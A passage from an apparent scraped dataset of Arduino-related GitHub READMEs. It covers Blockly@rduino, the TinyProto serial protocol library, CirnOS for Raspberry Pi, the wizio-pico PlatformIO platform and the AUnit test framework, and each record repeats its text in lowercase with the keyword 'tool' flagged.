ci-dessous).\nt\u00e9l\u00e9versement et console s\u00e9rie depuis l'interface web,\nsauvegarde/lecture de fichiers ino et xml\ncr\u00e9ation d'exemples\nsupervision de la carte en temps r\u00e9el gr\u00e2ce au serveur pymata-aio (accessible depuis le panneau de contr\u00f4le\nfunctions\nprogramming for arduino in drag'n'drop graphic\ngenerates a code fully compatible with the arduino code\ninteraction of arduino boards thanks to the added modules: more than 10 blocks specific to grove sensors/actuators, as well as those of technozone51, bitbloq, and ...\nability to automatically upload files to the site thanks to the parameters of the url address _(see the demos below)\nupload and serial console from the web interface\nbackup/reading of ino and xml files\ncreation of examples\nreal-time supervision of the map thanks to the pymata-aio server (accessible from the control panel\nd\u00e9mos\nblockly@rduino est un outil web, un webware par r\u00e9f\u00e9rence aux software, hardware, etc. vous pouvez le tester/utiliser \u00e0 l'adresse suivante : http://technologiescollege.github.io/blockly-at-rduino/\nvous pouvez donc aussi lier directement l'ouverture de la page \u00e0 l'ouverture d'un fichier xml h\u00e9berg\u00e9 (ou tout en local) :\nd\u00e9mo 1 : faire clignoter une diode\nd\u00e9mo 2 : faire varier un servo-moteur proportionnellement \u00e0 une consigne de potentiom\u00e8tre\ndemos\nblockly@rduino is a web -----> tool !!! , a webware by reference to software, hardware, etc.. you can test/use it at the following address : http://technologiescollege.github.io/blockly-at-rduino/\nso you can also link directly the opening of the page to the opening of a hosted xml file (or all locally) :\ndemo 1: flashing a diode\ndemo 2: vary a servo-motor proportionally to a potentiometer setpoint\nutiliser en local dans son navigateur web\nsi vous pr\u00e9fr\u00e9ez l'utiliser en local, il vous suffit de t\u00e9l\u00e9charger le code depuis github (download zip) et d'ouvrir le fichier index.html dans votre navigateur.\nvous pouvez l'h\u00e9berger sur un serveur, et ainsi y faire acc\u00e9der de nombreux postes en pointant vers ce fichier 'index.html'.\npour le t\u00e9l\u00e9versement et la console s\u00e9rie, vous devez t\u00e9l\u00e9charger la version 'electron' : https://github.com/technologiescollege/blocklyarduino_electrified.\nuse locally in your web browser\nif you want to use it locally, just download the code from github (download zip) and open the file index.html in your browser.\nyou can host it on a server, and thus make many computers access it by pointing to this file `index.html'.\nfor the upload and the serial console, you have to download the 'electron' version : https://github.com/technologiescollege/blocklyarduino_electrified.\nauteurs et contributeurs\nprogramme blockly : https://developers.google.com/blockly/\nconcept d'origine blocklyduino : fred lin (@gasolin https://github.com/gasolin/blocklyduino).\nson projet s'est aussi inspir\u00e9 de ardublock et modkit.\nfonctions de typage ardublockly : carlos pereira atencio (https://github.com/carlosperate/ardublockly).\nint\u00e9gration de codebender : julien rat https://github.com/julienrat\nr\u00e9-\u00e9criture totale et refonte graphique : olivier m\u00e9tayer\njulien rat : codebender plugin\nfr\u00e9d\u00e9ric picard : bitbloq, maquette jeulin, vid\u00e9os, etc\nspanish translation : jos\u00e9 manuel ruiz gutteriez (blog)\ndaniel pers (site) : fdplayer, oled, rgb led\nbernard remond site : t\u00e9l\u00e9versement local", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000411, "year": null}, {"Unnamed: 0": 2452, "autor": 412, "date": null, "content": "Introduction\nKey Features\nSupported platforms\nEasy to use\nCpp\nPython\nSetting up\nHow to buid\nUsing tiny_loopback tool\nLicense\nIntroduction\nIf you want to get stable code, please, refer to stable branch. HD (half duplex) protocol is removed from this version. If you need it, please refer to stable branch.\nTiny Protocol is layer 2 protocol. It is intended to be used for the systems with low resources. It is also can be compiled for desktop Linux system, and it can be built it for Windows. Using this library you can easy implement data transfer between 2 microcontrollers or between microcontroller and pc via UART, SPI, I2C or any other communication channels. You don't need to think about data synchronization between points. The library use no dynamic allocation of memory. TinyProto is based on RFC 1662, it implements the following frames:\nU-frames (SABM, UA)\nS-frames (REJ, RR)\nI-frames\nKey Features\nMain features:\nHot plug/unplug support\nConnection autorecover for Full duplex and Light protocols (with enabled crc)\nPlatform independent hdlc framing implementation (hdlc low level API: hdlc_ll_xxxx)\nHigh level hdlc implementation for backward compatibility with previous releases (hdlc_xxxx API)\nEasy to use Light protcol (tiny_light_xxxx API, see examples)\nFull-duplex protocol (tiny_fd_xxxx true RFC 1662 implementation, supports confirmation, frames retransmissions)\nError detection (low level, high level hdlc and full duplex (fd) protocols)\nSimple 8-bit checksum (sum of bytes)\nFCS16 (CCITT-16)\nFCS32 (CCITT-32)\nFrames of maximum 32K or 2G size (payload limit depends on platform).\nLow SRAM consumption (starts at 50 bytes).\nLow Flash consumption (starts at 1KiB, features can be disabled and enabled at compilation time)\nNo dynamic memory allocation\nSpecial serial loopback tool for debug purposes and performance testing\nSupported platforms\nAny platform, where C/C++ compiler is available (C99, C++11)\nPlatform Examples\nESP32 IDF\nCortex M0 Zero\nLinux Linux\nWindows Win32\nOther Any platform with implemented HAL\nWhat if my platform is not yet supported?\nThat's not a problem. Just implement abstraction layer for your platform (timing and mutex functions). Refer to tiny_hal_init() function. To understand HAL implementation refer to Linux and ESP32 examples in HAL abstraction layer. Do not forget to add TINY_CUSTOM_PLATFORM define to your compilation flags. You may use template code platform_hal.c\nEasy to use\nCpp\nUsage of light Tiny Protocol in C++ can look like this:\n#include \"TinyProtocol.h\"\ntinyproto::Light proto;\ntinyproto::Packet<256> packet;\nvoid setup() {\n...\nproto.beginToSerial();\n}\nvoid loop() {\nif (Serial.available()) {\nint len = proto.read( packet );\nif (len > 0) {\n/* Send message back */\nproto.write( packet );\n}\n}\n}\nExample of using full duplex Tiny Protocol in C++ is a little bit bigger, but it is still simple:\n#include \"TinyProtocol.h\"\ntinyproto::Fd<FD_MIN_BUF_SIZE(64,4)> proto;\nvoid onReceive(void *udata, tinyproto::IPacket &pkt) {\n// Process message here, you can do with the message, what you need\n// Let's send it back to the sender ;)\nif ( proto.write(pkt) == TINY_ERR_TIMEOUT ) {\n// Do what you need to do if looping back failed on timeout.\n// But never use blocking operations inside callback\n}\n}\nvoid setup() {\n...\n// Here we say FD protocol object, which callback to call once new msg is received\nproto.setReceiveCallback( onReceive );\nproto.begin();\n}\nvoid loop() {\nif (Serial.available()) {\nuint8_t byte = Serial.read();\nproto.run_rx( &byte, 1 ); // run FD protocol parser to process data received from the channel\n}\nuint8_t byte;\nif ( proto.run_tx( &byte, 1 ) == 1 ) // FD protocol fills buffer with data, we need to send to the channel\n{\nwhile ( Serial.write( byte ) == 0 ); // Just send the data\n}\n}\nPython\nimport tinyproto\np = tinyproto.Hdlc()\ndef on_read(a):\nprint(\"Received bytes: \" + ','.join( [ \"{:#x}\".format(x) for x in a ] ) )\n# setup protocol\np.on_read = on_read\np.begin()\n# provide rx bytes to the protocol, obtained from hardware rx channel\np.rx( bytearray([ 0x7E, 0xFF, 0x3F, 0xF3, 0x39, 0x7E ]) )\nHow to build\nLinux\nmake\n# === OR ===\nmkdir build\ncd build\ncmake -DEXAMPLES=ON ..\nmake\nWindows\nmkdir build\ncd build\ncmake -G \"Visual Studio 16 2019\" -DEXAMPLES=ON ..\nESP32\nJust place the library to your project components folder.\nSetting up\nArduino Option 1 (with docs and tools)\nDownload source from https://github.com/lexus2k/tinyproto\nPut the downloaded library content to Arduino/libraries/tinyproto folder\nRestart the Arduino IDE\nYou will find the examples in the Arduino IDE under File->Examples->tinyproto\nArduino Option 2 (only library without docs)\nGo to Arduino Library manager\nFind and install tinyproto library\nRestart the Arduino IDE\nYou will find the examples in the Arduino IDE under File->Examples->tinyproto\nESP32 IDF\nDownload sources from https://github.com/lexus2k/tinyproto and put to components folder of your project\nRun make for your project\nLinux\nDownload sources from https://github.com/lexus2k/tinyproto\nRun make command from tinyproto folder, and it will build library and tools for you\nPlain AVR\nDownload sources from https://github.com/lexus2k/tinyproto\nInstall avr gcc compilers\nRun make ARCH=avr\nPython\nDownload sources from https://github.com/lexus2k/tinyproto\nRun python setup.py install\nUsing tiny_loopback tool\nConnect your Arduino board to PC\nRun your sketch or tinylight_loopback\nCompile tiny_loopback tool\nRun tiny_loopback tool: ./bld/tiny_loopback -p /dev/ttyUSB0 -t light -g -c 8 -a -r\nConnect your Arduino board to PC\nRun your sketch or tinyfd_loopback\nCompile tiny_loopback tool\nRun tiny_loopback tool: ./bld/tiny_loopback -p /dev/ttyUSB0 -t fd -c 8 -w 3 -g -a -r\nFor more information about this library, please, visit https://github.com/lexus2k/tinyproto. Doxygen documentation can be found at Codedocs xyz site. If you found any problem or have any idea, please, report to Issues section. If you find the library useful and want to support future development, you may contact me.\nLicense\nCopyright 2016-2021 (C) Alexey Dynda\nThis file is part of Tiny Protocol Library.\nProtocol Library is free software: you can redistribute it and/or modify it under the terms of the GNU Lesser General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.\nProtocol Library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more details.\nYou should have received a copy of the GNU Lesser General Public License along with Protocol Library. If not, see http://www.gnu.org/licenses/.", "link": "https://github.com/lexus2k/tinyproto", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "introduction\nkey features\nsupported platforms\neasy to use\ncpp\npython\nsetting up\nhow to buid\nusing tiny_loopback -----> tool !!! \nlicense\nintroduction\nif you want to get stable code, please, refer to stable branch. hd (half duplex) protocol is removed from this version. if you need it, please refer to stable branch.\ntiny protocol is layer 2 protocol. it is intended to be used for the systems with low resources. it is also can be compiled for desktop linux system, and it can be built it for windows. using this library you can easy implement data transfer between 2 microcontrollers or between microcontroller and pc via uart, spi, i2c or any other communication channels. you don't need to think about data synchronization between points. the library use no dynamic allocation of memory. tinyproto is based on rfc 1662, it implements the following frames:\nu-frames (sabm, ua)\ns-frames (rej, rr)\ni-frames\nkey features\nmain features:\nhot plug/unplug support\nconnection autorecover for full duplex and light protocols (with enabled crc)\nplatform independent hdlc framing implementation (hdlc low level api: hdlc_ll_xxxx)\nhigh level hdlc implementation for backward compatibility with previous releases (hdlc_xxxx api)\neasy to use light protcol (tiny_light_xxxx api, see examples)\nfull-duplex protocol (tiny_fd_xxxx true rfc 1662 implementation, supports confirmation, frames retransmissions)\nerror detection (low level, high level hdlc and full duplex (fd) protocols)\nsimple 8-bit checksum (sum of bytes)\nfcs16 (ccitt-16)\nfcs32 (ccitt-32)\nframes of maximum 32k or 2g size (payload limit depends on platform).\nlow sram consumption (starts at 50 bytes).\nlow flash consumption (starts at 1kib, features can be disabled and enabled at compilation time)\nno dynamic memory allocation\nspecial serial loopback tool for debug purposes and performance testing\nsupported platforms\nany platform, where c/c++ compiler is available (c99, c++11)\nplatform examples\nesp32 idf\ncortex m0 zero\nlinux linux\nwindows win32\nother any platform with implemented hal\nwhat if my platform is not yet supported?\nthat's not a problem. just implement abstraction layer for your platform (timing and mutex functions). refer to tiny_hal_init() function. to understand hal implementation refer to linux and esp32 examples in hal abstraction layer. do not forget to add tiny_custom_platform define to your compilation flags. you may use template code platform_hal.c\neasy to use\ncpp\nusage of light tiny protocol in c++ can look like this:\n#include \"tinyprotocol.h\"\ntinyproto::light proto;\ntinyproto::packet<256> packet;\nvoid setup() {\n...\nproto.begintoserial();\n}\nvoid loop() {\nif (serial.available()) {\nint len = proto.read( packet );\nif (len > 0) {\n/* send message back */\nproto.write( packet );\n}\n}\n}\nexample of using full duplex tiny protocol in c++ is a little bit bigger, but it is still simple:\n#include \"tinyprotocol.h\"\ntinyproto::fd<fd_min_buf_size(64,4)> proto;\nvoid onreceive(void *udata, tinyproto::ipacket &pkt) {\n// process message here, you can do with the message, what you need\n// let's send it back to the sender ;)\nif ( proto.write(pkt) == tiny_err_timeout ) {\n// do what you need to do if looping back failed on timeout.\n// but never use blocking operations inside callback\n}\n}\nvoid setup() {\n...\n// here we say fd protocol object, which callback to call once new msg is received\nproto.setreceivecallback( onreceive );\nproto.begin();\n}\nvoid loop() {\nif (serial.available()) {\nuint8_t byte = serial.read();\nproto.run_rx( &byte, 1 ); // run fd protocol parser to process data received from the channel\n}\nuint8_t byte;\nif ( proto.run_tx( &byte, 1 ) == 1 ) // fd protocol fills buffer with data, we need to send to the channel\n{\nwhile ( serial.write( byte ) == 0 ); // just send the data\n}\n}\npython\nimport tinyproto\np = tinyproto.hdlc()\ndef on_read(a):\nprint(\"received bytes: \" + ','.join( [ \"{:#x}\".format(x) for x in a ] ) )\n# setup protocol\np.on_read = on_read\np.begin()\n# provide rx bytes to the protocol, obtained from hardware rx channel\np.rx( bytearray([ 0x7e, 0xff, 0x3f, 0xf3, 0x39, 0x7e ]) )\nhow to build\nlinux\nmake\n# === or ===\nmkdir build\ncd build\ncmake -dexamples=on ..\nmake\nwindows\nmkdir build\ncd build\ncmake -g \"visual studio 16 2019\" -dexamples=on ..\nesp32\njust place the library to your project components folder.\nsetting up\narduino option 1 (with docs and tools)\ndownload source from https://github.com/lexus2k/tinyproto\nput the downloaded library content to arduino/libraries/tinyproto folder\nrestart the arduino ide\nyou will find the examples in the arduino ide under file->examples->tinyproto\narduino option 2 (only library without docs)\ngo to arduino library manager\nfind and install tinyproto library\nrestart the arduino ide\nyou will find the examples in the arduino ide under file->examples->tinyproto\nesp32 idf\ndownload sources from https://github.com/lexus2k/tinyproto and put to components folder of your project\nrun make for your project\nlinux\ndownload sources from https://github.com/lexus2k/tinyproto\nrun make command from tinyproto folder, and it will build library and tools for you\nplain avr\ndownload sources from https://github.com/lexus2k/tinyproto\ninstall avr gcc compilers\nrun make arch=avr\npython\ndownload sources from https://github.com/lexus2k/tinyproto\nrun python setup.py install\nusing tiny_loopback tool\nconnect your arduino board to pc\nrun your sketch or tinylight_loopback\ncompile tiny_loopback tool\nrun tiny_loopback tool: ./bld/tiny_loopback -p /dev/ttyusb0 -t light -g -c 8 -a -r\nconnect your arduino board to pc\nrun your sketch or tinyfd_loopback\ncompile tiny_loopback tool\nrun tiny_loopback tool: ./bld/tiny_loopback -p /dev/ttyusb0 -t fd -c 8 -w 3 -g -a -r\nfor more information about this library, please, visit https://github.com/lexus2k/tinyproto. doxygen documentation can be found at codedocs xyz site. if you found any problem or have any idea, please, report to issues section. if you find the library useful and want to support future development, you may contact me.\nlicense\ncopyright 2016-2021 (c) alexey dynda\nthis file is part of tiny protocol library.\nprotocol library is free software: you can redistribute it and/or modify it under the terms of the gnu lesser general public license as published by the free software foundation, either version 3 of the license, or (at your option) any later version.\nprotocol library is distributed in the hope that it will be useful, but without any warranty; without even the implied warranty of merchantability or fitness for a particular purpose. see the gnu lesser general public license for more details.\nyou should have received a copy of the gnu lesser general public license along with protocol library. if not, see http://www.gnu.org/licenses/.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000412, "year": null}, {"Unnamed: 0": 2453, "autor": 413, "date": null, "content": "Notice:\nFor a detailed summary of the current state of the CirnOS project, see this post on my blog.\nCirnOS\nCirnOS is an operating system for the Raspberry Pi built for the purpose of usability and simplicity. It provides a simple environment for running Lua scripts on Raspberry Pi. It has no kernel, but can use coroutines for time management. You run your code on the device, and that is it.\nCirnOS has only been tested on the Raspberry Pi Zero, but should work on the original Raspberry Pi and the Zero W. It is in development for Raspberry Pi 3.\nWhy use CirnOS when there's Raspbian?\nRaspbian is significantly more complex than what most Raspberry Pi users need. Often, an rPi is used for one specific embedded task. Like Arduino, it does not need a kernel, or different protection levels, or an operating system taking up hundreds of megabytes.\nThe workflow that Raspbian creates is also rather clunky. Without knowledge of SSH, it requires the user to plug in a keyboard, mouse and screen into their Raspberry Pi to program and configure it, while the project that the rPi is used for might not need any of these peripherals. Furthermore, setting up an application to run automatically is not straightforward given the tremendous number of ways to accomplish the task (CRON, systemd, initd, upstart, etc).\nTherefore, it makes sense to have a lightweight, extensible system that allows a user to treat the rPi as an embedded device and edit its scripts directly from their computer.\nUsing CirnOS\nFormat your rPi's SD card as FAT32, using a tool such as SD Association's SD Memory Card Formatter https://www.sdcard.org/downloads/formatter_4/.\nMake sure the root directory in the SD Card is empty, and that the SD Card has only one volume.\nCopy all files from ROOTDIR into the root of the SD Card.\nCopy cirnos.img from OBJ into the root of the SD Card.\nEdit main.lua to control the rPi.\nBuilding\nArch Linux\nBuilding CirnOS on Arch Linux requires an installation of the GNU Arm Embedded Toolchain, which can be found at https://www.archlinux.org/packages/community/x86_64/arm-none-eabi-gcc/. Once installed, run build.sh in the project directory to create the cirnos.img file in the object folder.\nFedora\nBuilding CirnOS on Fedora requires a full installation of the GNU Arm Embedded Toolchain, which can be set up by first installing the relevant binutils package found at https://rpmfind.net/linux/rpm2html/search.php?query=arm-none-eabi-gcc and then installing Newlib, which can be found at https://apps.fedoraproject.org/packages/arm-none-eabi-newlib. Following installation, run build.sh in the project directory to create the cirnos.img file in the object folder.\nWhy the name 'CirnOS'?\nCirnOS was built for use in my virtual pet project. This project was originally going to use 9front as its operating system, but I decided that 9front was too excessive for the tasks I needed my virtual pet to do. When I was using 9front it made sense to name my virtual pet after the mascot of the 9front operating system, the Touhou character Cirno. The name CirnOS is therefore a portmanteau of Cirno and OS.\nThis may alienate some Touhou fans, but to differentiate CirnOS from the Touhou character, the preferred pronounciation of CirnOS is 'Sir\u00b7nose'.\nIs there a tutorial or guide to using CirnOS?\nNot currently. That will be added in the future. For now we have a repository of examples to use for reference: https://github.com/mchlmmc/CirnOSExamples", "link": "https://github.com/mchlmmc/CirnOS", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "notice:\nfor a detailed summary of the current state of the cirnos project, see this post on my blog.\ncirnos\ncirnos is an operating system for the raspberry pi built for the purpose of usability and simplicity. it provides a simple environment for running lua scripts on raspberry pi. it has no kernel, but can use coroutines for time management. you run your code on the device, and that is it.\ncirnos has only been tested on the raspberry pi zero, but should work on the original raspberry pi and the zero w. it is in development for raspberry pi 3.\nwhy use cirnos when there's raspbian?\nraspbian is significantly more complex than what most raspberry pi users need. often, an rpi is used for one specific embedded task. like arduino, it does not need a kernel, or different protection levels, or an operating system taking up hundreds of megabytes.\nthe workflow that raspbian creates is also rather clunky. without knowledge of ssh, it requires the user to plug in a keyboard, mouse and screen into their raspberry pi to program and configure it, while the project that the rpi is used for might not need any of these peripherals. furthermore, setting up an application to run automatically is not straightforward given the tremendous number of ways to accomplish the task (cron, systemd, initd, upstart, etc).\ntherefore, it makes sense to have a lightweight, extensible system that allows a user to treat the rpi as an embedded device and edit its scripts directly from their computer.\nusing cirnos\nformat your rpi's sd card as fat32, using a -----> tool !!!  such as sd association's sd memory card formatter https://www.sdcard.org/downloads/formatter_4/.\nmake sure the root directory in the sd card is empty, and that the sd card has only one volume.\ncopy all files from rootdir into the root of the sd card.\ncopy cirnos.img from obj into the root of the sd card.\nedit main.lua to control the rpi.\nbuilding\narch linux\nbuilding cirnos on arch linux requires an installation of the gnu arm embedded toolchain, which can be found at https://www.archlinux.org/packages/community/x86_64/arm-none-eabi-gcc/. once installed, run build.sh in the project directory to create the cirnos.img file in the object folder.\nfedora\nbuilding cirnos on fedora requires a full installation of the gnu arm embedded toolchain, which can be set up by first installing the relevant binutils package found at https://rpmfind.net/linux/rpm2html/search.php?query=arm-none-eabi-gcc and then installing newlib, which can be found at https://apps.fedoraproject.org/packages/arm-none-eabi-newlib. following installation, run build.sh in the project directory to create the cirnos.img file in the object folder.\nwhy the name 'cirnos'?\ncirnos was built for use in my virtual pet project. this project was originally going to use 9front as its operating system, but i decided that 9front was too excessive for the tasks i needed my virtual pet to do. when i was using 9front it made sense to name my virtual pet after the mascot of the 9front operating system, the touhou character cirno. the name cirnos is therefore a portmanteau of cirno and os.\nthis may alienate some touhou fans, but to differentiate cirnos from the touhou character, the preferred pronounciation of cirnos is 'sir\u00b7nose'.\nis there a tutorial or guide to using cirnos?\nnot currently. that will be added in the future. for now we have a repository of examples to use for reference: https://github.com/mchlmmc/cirnosexamples", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000413, "year": null}, {"Unnamed: 0": 2464, "autor": 424, "date": null, "content": "Raspberry Pi Pico RP2040 - PlatformIO ( Pico-SDK & Arduino )\nA few words in the beginning\nVersion: 1.0.9 The project is a work in progress, there may be bugs...\nLook here, if there is something new\nThis project is based on PICO-SDK\nPICO-SDK ( the file organization has been restructured to be flexible and have a fast compilation )\nver 1.2.0 release ( default )\nATT: some #define keys is renamed to LIB_PICO_foo. Please read Pico SDK documentation or ask in PI forum\nFrameworks\nBaremetal ( pico-sdk, C/C++ ) baremetal is just a name for pico-sdk here\nArduino ( in progress... )\nDebug ( in progress... )\nPICOPROBE ( Windows for now )\nCMSIS-DAP windows\nLibraries FreeRTOS, FatFS, littlefs ... etc\nBasic File System ( RAM disk, FLASH disk, SD card )\nREAD WIKI\nFramework code\nBaremetal Examples\nArduino Examples\nVideo demo - Arduino - TFT ST7789\nSystems support\nWindows, Linux, Darwin\nNotes\nPlease Re-Install the platform. The project is a work in progress and the platform is installed from here...\nI am in Home-Office, it's hard for me to test hardwares as SPI, I2C ... etc\nInstall Platform\nNote: be sure git is installed\nPIO Home > Platforms > Advanced Installation\npaste https://github.com/Wiz-IO/wizio-pico\nINSTALL\nUninstall ( fast ) ... Re-Install ( do this and Install again )\nIn directory C:\\Users\\USER_NAME.platformio\\platforms\ndelete folder wizio-pico ( builders )\nIn directory C:\\Users\\USER_NAME.platformio\\packages\ndelete folder framework-wizio-pico ( sources )\ndelete folder toolchain-gccarmnoneeabi (compiler, may not be deleted )\ndelete folder tool-wizio-pico ( tools, picoasm )\nBaremetal - New Project\nPlatformIO -> Home -> New\nEnter Project Name - Board search 'WizIO-PICO' boards - Select Baremetal\nClick BUILD and you will have basic project ( from template )\nFor CPP project, rename main.c to main.cpp ( if you delete main file, builder will create new main.c as template )\nConnect Pico as Mass Storage Device\nOpen platformio.ini and edit your settings\nBUILD / UPLOAD\nREAD WIKI - BAREMETAL\nArduino - New Project\nPlatformIO -> Home -> New\nEnter Project Name - Board search 'WizIO-PICO' boards - Select Arduino\nConnect Pico as Mass Storage Device\nOpen platformio.ini and edit your settings\nBUILD / UPLOAD\nREAD WIKI - ARDUINO\nNOTE\nIF PICO_STDIO_USB is used, the Uploader will try ro reset Pico to boot-uf2 mode without button and USB cable remove\nThanks to:\nTimo Sandmann\nDean Blackketter\nIvan Kravets ( PlatformIO )\nComet Electronics\nIf you want to help / support:", "link": "https://github.com/Wiz-IO/wizio-pico", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "raspberry pi pico rp2040 - platformio ( pico-sdk & arduino )\na few words in the beginning\nversion: 1.0.9 the project is a work in progress, there may be bugs...\nlook here, if there is something new\nthis project is based on pico-sdk\npico-sdk ( the file organization has been restructured to be flexible and have a fast compilation )\nver 1.2.0 release ( default )\natt: some #define keys is renamed to lib_pico_foo. please read pico sdk documentation or ask in pi forum\nframeworks\nbaremetal ( pico-sdk, c/c++ ) baremetal is just a name for pico-sdk here\narduino ( in progress... )\ndebug ( in progress... )\npicoprobe ( windows for now )\ncmsis-dap windows\nlibraries freertos, fatfs, littlefs ... etc\nbasic file system ( ram disk, flash disk, sd card )\nread wiki\nframework code\nbaremetal examples\narduino examples\nvideo demo - arduino - tft st7789\nsystems support\nwindows, linux, darwin\nnotes\nplease re-install the platform. the project is a work in progress and the platform is installed from here...\ni am in home-office, it's hard for me to test hardwares as spi, i2c ... etc\ninstall platform\nnote: be sure git is installed\npio home > platforms > advanced installation\npaste https://github.com/wiz-io/wizio-pico\ninstall\nuninstall ( fast ) ... re-install ( do this and install again )\nin directory c:\\users\\user_name.platformio\\platforms\ndelete folder wizio-pico ( builders )\nin directory c:\\users\\user_name.platformio\\packages\ndelete folder framework-wizio-pico ( sources )\ndelete folder toolchain-gccarmnoneeabi (compiler, may not be deleted )\ndelete folder -----> tool !!! -wizio-pico ( tools, picoasm )\nbaremetal - new project\nplatformio -> home -> new\nenter project name - board search 'wizio-pico' boards - select baremetal\nclick build and you will have basic project ( from template )\nfor cpp project, rename main.c to main.cpp ( if you delete main file, builder will create new main.c as template )\nconnect pico as mass storage device\nopen platformio.ini and edit your settings\nbuild / upload\nread wiki - baremetal\narduino - new project\nplatformio -> home -> new\nenter project name - board search 'wizio-pico' boards - select arduino\nconnect pico as mass storage device\nopen platformio.ini and edit your settings\nbuild / upload\nread wiki - arduino\nnote\nif pico_stdio_usb is used, the uploader will try ro reset pico to boot-uf2 mode without button and usb cable remove\nthanks to:\ntimo sandmann\ndean blackketter\nivan kravets ( platformio )\ncomet electronics\nif you want to help / support:", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000424, "year": null}, {"Unnamed: 0": 2472, "autor": 432, "date": null, "content": "AUnit\nA unit testing framework for Arduino platforms inspired by by ArduinoUnit and Google Test. The unit tests usually run on the embedded controller which allows detection of architecture-specific problems. But for faster development, many unit tests can be compiled and executed natively on Linux or MacOS using the EpoxyDuino companion project.\nAUnit is almost a drop-in replacement of ArduinoUnit with some advantages. AUnit supports timeouts and test fixtures. It sometimes consumes 50% less flash memory on the AVR platform, and it has been tested to work on the AVR, SAMD21, STM32, ESP8266, ESP32 and Teensy platforms. Another companion project AUniter project provides command line tools to verify, upload and validate the unit tests to the microcontroller, instead of having to go through the Arduino IDE. Both the AUniter and EpoxyDuino tools can be used in a continuous integration system like Jenkins, or with GitHub Actions.\nVersion: 1.6 (2021-11-02)\nChangelog: CHANGELOG.md\nTable of Contents\nSummary\nArduinoUnit Compatible Features\nMissing Features\nAdded Features\nInstallation\nSource Code\nDocumentation\nExamples\nUsage\nHeader and Namespace\nVerbose Mode\nDefining the Tests\nGenerated Class and Instance Names\nBinary Assertions\nSupported Parameter Types\nParameter Types Must Match\nPointer Comparisons\nCase Insensitive String Comparisons\nApproximate Comparisons\nBoolean Assertions\nTest Fixtures\nEarly Return and Delayed Assertions\nMeta Assertions\nUnconditional Termination\nOverridable Methods\nRunning the Tests\nFiltering Test Cases\nOutput Printer\nControlling Verbosity\nLine Number Mismatch\nTest Framework Messages\nAssertion Message\nVerbose Mode Message\nTest Case Summary\nTest Runner Summary\nTest Timeout\nGoogleTest Adapter\nCommand Line Tools\nAUniter\nEpoxyDuino\nCommand Line Flags and Arguments\nContinuous Integration\nArduino IDE/CLI + Cloud\nArduino IDE/CLI + Jenkins\nEpoxyDuino + Jenkins\nEpoxyDuino + Cloud (Recommended)\nTips\nDebugging Assertions in Fixtures\nClass Hierarchy\nTesting Private Helper Methods\nBenchmarks\nSystem Requirements\nHardware\nTool Chain\nOperating System\nLicense\nFeedback and Support\nAuthors\nSummary\nAUnit was created to solve 3 problems with ArduinoUnit 2.2:\nArduinoUnit consumes too much flash memory on an AVR platform (e.g. Arduino UNO, Nano) as explained in ArduinoUnit#70.\nArduinoUnit does not compile on the ESP8266 platform (see ArduinoUnit#68, ArduinoUnit#55, ArduinoUnit#54).\nArduinoUnit does not provide an easy way to create tests using fixtures, equivalent to the TEST_F() macro in Google Test.\nIn contrast:\nAUnit consumes as much as 65% less flash memory than ArduinoUnit 2.2 on the AVR platform. On Teensy-ARM, the savings can be as much as 30%.\nAUnit has been tested on AVR, Teensy-ARM and ESP8266.\nAUnit implements the testF() and testingF() macros to use fixtures.\nThe AUniter command line tools can compile the unit tests, upload them to Arduino boards attached to the serial ports of the local machine, and validate the output of the AUnit test runner. In addition, the AUniter script can be integrated into a Jenkins continuous integration service running on the local machine, and the unit tests can be monitored automatically.\nUnit tests written using AUnit can often be compiled and executed natively on Linux or MacOS using the EpoxyDuino library. The output on the Serial object is redirected to the stdout of the Unix host. This provides another avenue for implementing continuous builds or integration.\nArduinoUnit Compatible Features\nFor basic unit tests written using ArduinoUnit 2.2, only two changes are required to convert to AUnit:\n#include <ArduinoUnit.h> -> #include <AUnit.h>\nTest::run() -> aunit::TestRunner::run()\nMost of the core macros are compatible between ArduinoUnit and AUnit:\ntest()\ntesting()\nassertXxx()\nMeta Assertions\ncheckTestXxx()\nassertTestXxx()\nexternTest()\nexternTesting()\nAUnit also supports exclude and include filters:\nTestRunner::exclude()\nTestRunner::include()\nThe various assertion and test status messages can be enabled or disabled using the Verbosity flags on per test basis:\nenableVerbosity()\ndisableVerbosity()\nMissing Features\nHere are the features which have not been ported over from ArduinoUnit 2.2:\nArduinoUnit supports multiple * wildcards in its exclude() and include() methods. AUnit supports only a single * wildcard and it must occur at the end if present.\nAdded Features\nHere are the features in AUnit which are not available in ArduinoUnit 2.2:\nConfigurable timeout parameter to prevent testing() test cases from running forever:\nTestRunner::setTimeout(seconds)\nTest::expire()\nassertTestExpire()\nassertTestNotExpire()\ncheckTestExpire()\ncheckTestNotExpire()\nCase-insensitive string comparisons:\nassertStringCaseEqual()\nassertStringCaseNotEqual()\nApproximate comparisons:\nassertNear()\nasssertNotNear()\nSupports 64-bit integer\nassertXxx() support both long long and unsigned long long\ntest() and testing() macros support both 1 and 2 arguments\ntest(testName) and test(suiteName, testName)\ntesting(testName) and testing(suiteName, testName)\nTest fixtures using the \"F\" variations of existing macros:\ntestF()\ntestingF()\nassertTestXxxF()\ncheckTestXxxF()\nexternTestF()\nexternTestingF()\nUnconditional termination:\npassTestNow()\nfailTestNow()\nskipTestNow()\nexpireTestNow()\nteardown() method which mirrors the setup() method:\nteardown()\nTest filters support 2-arguments, matching testF() and testingF():\nTestRunner::include(testClass, name)\nTestRunner::exclude(testClass, name)\nNo dynamic allocation of heap memory:\nThe library does not create a String object.\nIt reads from a String if the calling code provides it.\nTerse and verbose modes:\n#include <AUnit.h> - terse messages use less flash memory\n#include <AUnitVerbose.h> - verbose messages use more flash memory\nEvery feature of AUnit is unit tested using AUnit 